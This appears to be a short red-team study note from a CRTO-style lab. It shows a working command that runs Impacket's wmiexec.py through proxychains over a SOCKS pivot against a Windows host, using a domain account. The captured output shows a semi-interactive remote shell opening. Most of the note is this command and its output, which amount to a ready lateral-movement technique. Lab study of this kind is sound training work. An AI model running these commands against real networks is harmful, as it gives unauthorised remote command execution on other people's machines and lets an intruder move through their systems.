You can run tools over the proxy pivot to connect to Windows boxes like WMI:

```
ubuntu@DESKTOP-3BSK7NO ~ > proxychains wmiexec.py DEV/jking@10.10.122.30
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:135-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:49667-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
```

### ⚠ Opsec




### Properties
---
📆 created   {{17-02-2024}} 18:20
🏷️ tags: #redteam #crto 

---

